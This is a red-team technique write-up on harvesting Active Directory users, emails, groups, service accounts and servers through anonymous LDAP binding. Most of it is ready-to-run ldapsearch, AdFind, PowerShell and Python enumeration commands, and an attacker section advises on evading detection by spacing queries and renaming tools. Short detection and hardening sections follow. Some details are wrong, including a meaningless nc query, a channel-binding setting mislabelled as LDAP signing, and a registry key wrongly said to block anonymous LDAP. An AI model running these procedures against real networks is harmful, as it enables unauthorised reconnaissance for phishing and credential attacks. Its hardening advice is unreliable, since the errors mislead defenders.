# REC-AD-002: Anonymous LDAP Binding Domain Extraction

**SERVTEP ID:** REC-AD-002  
**Technique Name:** Anonymous LDAP Binding domain extraction  
**MITRE ATT&CK Mapping:** T1589.002 (Gather Victim Identity Information - Email Addresses)  
**CVE Reference:** N/A  
**Environment:** Windows Active Directory  
**Severity:** High  
**Difficulty:** Easy  

---

## Executive Summary

Anonymous LDAP binding is a foundational reconnaissance technique that allows unauthenticated attackers to query Active Directory directly using LDAP protocol. When anonymous access is enabled on domain controllers, attackers can extract comprehensive directory information including user accounts, groups, computer objects, and organizational structure without credentials. This technique is particularly dangerous because many organizations unknowingly allow null-bind LDAP access.

---

## Objective

Extract sensitive Active Directory information via anonymous LDAP binding:
- User accounts and email addresses
- Group memberships and distribution lists
- Computer objects and server names
- Exchange mailbox information
- Organization structure and descriptions
- Domain functional levels and forest topology
- Service account identification

---

## Prerequisites

- Network connectivity to Active Directory domain controller (TCP port 389 LDAP or 636 LDAPS)
- LDAP client tools (ldapsearch, AdFind, PowerShell ADSI, etc.)
- No authentication credentials required
- Knowledge of target domain name (optional—can enumerate via DNS)

---

## Execution Procedures

### Method 1: LDAP Anonymous Binding via Command Line

**Step 1:** Enumerate domain naming context
```bash
# Query domain schema without credentials
ldapsearch -h <domain-controller-ip> -p 389 -x -s base -b "" "(objectClass=*)" namingContexts

# Example:
ldapsearch -h 192.168.1.100 -p 389 -x -s base "(objectClass=*)" | grep namingContext
```

**Expected Output:**
```
namingContexts: DC=example,DC=com
namingContexts: CN=Configuration,DC=example,DC=com
namingContexts: CN=Schema,CN=Configuration,DC=example,DC=com
```

**Step 2:** Query all user objects
```bash
# Extract all AD users with email addresses
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(objectClass=user)" \
  sAMAccountName mail userPrincipalName displayName

# Filter for enabled accounts only
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))))" \
  sAMAccountName mail
```

**Step 3:** Export all groups and members
```bash
# Extract group objects
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(objectClass=group)" \
  cn member description memberOf

# Get nested group members
ldapsearch -h <dc-ip> -p 389 -x -b "DC=example,DC=com" \
  "(&(objectClass=group)(cn=Domain Admins))" \
  member
```

### Method 2: PowerShell ADSI-Based Enumeration

**Step 1:** Connect to Active Directory via ADSI
```powershell
# Direct LDAP binding (anonymous)
[System.DirectoryServices.DirectoryEntry]$de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.1.100")

# Query users
$searcher = New-Object System.DirectoryServices.DirectorySearcher($de)
$searcher.Filter = "(objectClass=user)"
$searcher.PropertiesToLoad.Add("sAMAccountName")
$searcher.PropertiesToLoad.Add("mail")
$results = $searcher.FindAll()

$results | ForEach-Object {
  $_.Properties["sAMAccountName"][0]
  $_.Properties["mail"][0]
}
```

**Step 2:** Extract domain functional level and forest topology
```powershell
# Query domain mode
$de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
$de.Properties["domainFunctionality"][0]
$de.Properties["forestFunctionality"][0]

# Get domain controller FSMO roles
$de.Properties["fsmoRoleOwner"]
```

### Method 3: AdFind Tool (Specialized LDAP Scanner)

**Step 1:** Download and execute AdFind
```bash
# Enumerate all users with minimal output
.\adfind.exe -h 192.168.1.100 -default -users -csv

# Extract Exchange mailbox information
.\adfind.exe -h 192.168.1.100 -default -users \
  -f "(&(objectClass=user)(mailNickname=*))" \
  sAMAccountName mail proxyAddresses -csv

# Find service accounts
.\adfind.exe -h 192.168.1.100 -default -users \
  -f "(&(objectClass=user)(|(sAMAccountName=*svc)(sAMAccountName=*service))))" \
  sAMAccountName displayName -csv
```

**Step 2:** Enumerate computers and servers
```bash
# Get all domain computers
.\adfind.exe -h 192.168.1.100 -default -computers \
  -f "(&(objectClass=computer)(operatingSystem=*))" \
  cn dNSHostName operatingSystem lastLogonTimestamp -csv

# Filter for servers only
.\adfind.exe -h 192.168.1.100 -default -computers \
  -f "(&(objectClass=computer)(operatingSystem=*Server*))" \
  cn dNSHostName operatingSystem -csv
```

### Method 4: LDAP Anonymous Binding via ldapsearch on Linux

**Step 1:** Full domain enumeration
```bash
# Enumerate all objects in domain
ldapsearch -x -h <dc-ip> -b "DC=example,DC=com" \
  -s sub "objectClass=*" | tee ldap-dump.ldif

# Extract user information into CSV
ldapsearch -x -h <dc-ip> -b "DC=example,DC=com" \
  "(objectClass=user)" sAMAccountName mail description | \
  grep -E "^(sAMAccountName|mail|description):" > users.txt
```

**Step 2:** Parse LDIF for actionable intelligence
```bash
# Extract all email addresses
grep "^mail:" ldap-dump.ldif | cut -d' ' -f2- > emails.txt

# Find service accounts (common naming patterns)
grep "^sAMAccountName:" ldap-dump.ldif | \
  grep -iE "(svc|service|admin|backup|exchange)" > service-accounts.txt

# Identify computer objects
ldapsearch -x -h <dc-ip> -b "DC=example,DC=com" \
  "(objectClass=computer)" cn dNSHostName operatingSystem > computers.txt
```

### Method 5: Windows Command-Line Tools (Built-in)

**Step 1:** Using cmd.exe and dsquery
```cmd
REM Query users via LDAP (if tools available)
dsquery user -domain example.com -limit 10000 | dsget user -samid -email

REM Get computers
dsquery computer -limit 10000 | dsget computer -name -dnsname

REM Get groups
dsquery group -limit 10000 | dsget group -samid -members
```

**Step 2:** Manual LDAP port scanning and banner grabbing
```cmd
REM Check for LDAP availability
netstat -an | find "389"
nmap -p 389,636 <dc-ip>

REM Connect and query via Telnet/nc (if nc available)
echo "SELECT * FROM ds" | nc -w 2 <dc-ip> 389
```

### Method 6: Python LDAP Enumeration Script

**Step 1:** Using python-ldap library
```python
import ldap

# Connect anonymously
ld = ldap.initialize('ldap://192.168.1.100:389')
ld.simple_bind_s()

# Search for all users
results = ld.search_s(
    'DC=example,DC=com',
    ldap.SCOPE_SUBTREE,
    '(objectClass=user)',
    ['sAMAccountName', 'mail', 'displayName']
)

for dn, attrs in results:
    print(f"User: {attrs.get('sAMAccountName', [b''])[0].decode()}")
    print(f"Email: {attrs.get('mail', [b''])[0].decode()}")
    print(f"Display: {attrs.get('displayName', [b''])[0].decode()}")
    print("---")

# Query all groups
group_results = ld.search_s(
    'DC=example,DC=com',
    ldap.SCOPE_SUBTREE,
    '(objectClass=group)',
    ['cn', 'member', 'description']
)
```

### Method 7: LDAPS (Encrypted) Binding

**Step 1:** Query via LDAPS (SSL/TLS)
```bash
# LDAPS on port 636 (may not require authentication)
ldapsearch -H ldaps://<dc-ip>:636 -x -b "DC=example,DC=com" \
  "(objectClass=user)" sAMAccountName mail

# Ignore certificate warnings if needed
ldapsearch -H ldaps://<dc-ip>:636 -x -b "DC=example,DC=com" \
  -Z "(objectClass=user)"
```

---

## Technical Deep Dive

### LDAP Authentication Levels

Active Directory supports multiple LDAP authentication modes:

1. **Null Bind (Anonymous):** No credentials required—highest risk
2. **Simple Bind:** Plaintext credentials (deprecated, rarely enabled)
3. **SASL Bind:** Kerberos or NTLM authentication
4. **LDAPS:** TLS/SSL encrypted connections

### Dangerous LDAP Queries

**Null-bind disclosure queries:**
```ldap
# Query any object
(&(objectClass=*))

# Find Exchange objects (exposes mail systems)
(&(objectClass=msExchRecipient))

# Locate domain controllers
(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))

# Find service accounts
(&(objectClass=user)(servicePrincipalName=*))
```

### LDAP Attributes Exposed via Anonymous Binding

| Attribute | Risk | Information Disclosed |
|-----------|------|----------------------|
| sAMAccountName | High | Username for lateral movement |
| mail | High | Email for phishing campaigns |
| proxyAddresses | High | Exchange objects and aliases |
| memberOf | High | Group memberships → privilege escalation |
| servicePrincipalName | Critical | Kerberoastable accounts |
| lastLogonTimestamp | Medium | Active user identification |
| description | Medium | Password hints, notes (common mistake) |
| dNSHostName | Medium | Network topology, server names |
| operatingSystem | Medium | Target system identification |

---

## Detection Strategies (Blue Team)

### Directory Services Logging

1. **Enable LDAP Interface Logging**
   ```
   Registry Path: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\NTDS\Diagnostics
   Setting: "16 LDAP Interface Events" = 5 (verbose)
   Captures: All LDAP queries including anonymous
   ```

2. **Monitor Event ID 1644 (LDAP search)**
   - Excessive anonymous LDAP queries
   - Searches for sensitive attributes (servicePrincipalName)
   - Broad scope searches (subtree from root)

3. **Domain Controller Security Event Log**
   - Event ID 4662: Directory Services Object Accessed
   - Event ID 4689: Process Terminated
   - Event ID 5136: Directory Service Object Modified

### Network-Based Detection

1. **LDAP Query Monitoring (SIEM)**
   ```
   Alert Condition:
   - Source IP = external or non-domain-joined device
   - LDAP search scope = subtree from DC=...
   - Query filter contains: objectClass, mail, servicePrincipalName
   - Consecutive queries without pause
   ```

2. **Protocol Analysis**
   - Monitor for rapid LDAP bind/query cycles
   - Detect full directory dumps (large result sets)
   - Alert on LDAP port 389 access from unexpected sources

### EDR/Endpoint Detection

```
Indicator: Process spawning LDAP query tools
Processes: ldapsearch.exe, adfind.exe, AdExplorer.exe, dsquery.exe
Parent: cmd.exe, PowerShell.exe, cscript.exe
Severity: Medium (if from non-IT systems)
```

---

## Operational Security (OpSec) Considerations

### Attacker Perspective

1. **Stealth Querying**
   - Space LDAP queries across multiple domain controllers
   - Use legitimate sounding search filters (employee directory lookups)
   - Avoid comprehensive dumps; query specific object classes

2. **Credential Obfuscation**
   - If anonymous binding blocked, use compromised low-privilege account
   - Avoid queries that expose malicious intent (servicePrincipalName)
   - Slow enumeration over hours/days vs. minutes

3. **Tool Evasion**
   - Use built-in tools (PowerShell, dsquery) vs. specialized scanners
   - Replace AdFind binary signatures with renamed/recompiled versions
   - Encode LDAP filters to bypass string-based detection

### Defensive Hardening

1. **Disable Anonymous LDAP Binding**
   ```powershell
   # Set Restrict Anonymous: Restrict anonymous access to named pipes and shares only
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
     -Name "RestrictAnonymous" -Value 1
   ```

2. **Enable LDAP Signing and Channel Binding**
   ```powershell
   # Require LDAP signing
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
     -Name "LdapEnforceChannelBinding" -Value 2
   ```

3. **Active Directory Firewall Rules**
   - Restrict LDAP (389/636) to authenticated domain systems only
   - Block LDAP from DMZ, guest networks, and external sources
   - Implement network segmentation for domain controllers

---

## Mitigation Strategies

1. **Immediate Actions**
   - Set `RestrictAnonymous` registry key to 1 (deny anonymous LDAP)
   - Audit domain controllers for unauthorized LDAP queries
   - Review firewall rules for LDAP port accessibility

2. **Detection & Response**
   - Enable verbose LDAP diagnostic logging
   - Monitor for LDAP query spikes and unusual filters
   - Implement AD alerting for sensitive object queries

3. **Long-term Security**
   - Implement LDAP signing enforcement
   - Migrate to Kerberos-only authentication
   - Deploy Zero Trust access to directory services
   - Conduct regular LDAP security audits

---

## References & Further Reading

- [Microsoft: Restricting Anonymous Access](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-anonymous-access-to-named-pipes-and-shares)
- [LDAP Protocol RFC 4511](https://tools.ietf.org/html/rfc4511)
- [T1589.002 - MITRE ATT&CK](https://attack.mitre.org/techniques/T1589/002/)
- [Active Directory Security Hardening](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
- [LDAP Authentication Best Practices](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-restrict-anonymous-access-to-named-pipes-and-shares)

---

## Related SERVTEP Techniques

- **REC-AD-003**: PowerView enumeration (authenticated AD recon)
- **REC-AD-004**: SPN scanning (builds on user enumeration)
- **REC-AD-005**: BadPwdCount monitoring (targets enumerated accounts)
- **CA-KERB-001**: Kerberoasting (leverages SPN discovered via LDAP)

---

## Timeline

| Phase | Duration | Notes |
|-------|----------|-------|
| Domain discovery | < 1 minute | Query naming context |
| Full user enumeration | 2-5 minutes | Extract all users, emails |
| Group membership mapping | 2-5 minutes | Identify sensitive groups |
| Computer discovery | 1-3 minutes | Map network topology |
| **Total sweep** | **5-15 minutes** | Depends on directory size |

---

**Last Updated:** December 2025  
**Classification:** SERVTEP Research Division  
**Status:** Verified & Operational
